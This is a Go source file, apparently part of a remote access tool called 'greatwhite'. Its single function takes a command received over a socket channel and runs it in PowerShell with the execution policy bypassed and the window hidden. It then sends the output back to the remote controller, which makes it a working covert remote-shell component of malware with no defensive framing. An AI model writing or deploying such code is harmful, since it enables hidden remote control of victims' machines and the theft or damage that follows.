package commands

import (
	"os/exec"
	"syscall"

	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/greatwhite/modules/models"
)

func shell(command string, c *gophersocket.Channel, selfTag string) {
	cmd := exec.Command("powershell", "-NoLogo", "-Ep", "Bypass", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	b, err := cmd.CombinedOutput()
	out := string(b)
	if err != nil {
		out = err.Error() + "\n" + out
	}
	if out == "" {
		out = "<success>"
	}
	c.Emit("repl", models.Resp{Resp: "Result: " + out, Tag: selfTag})
}
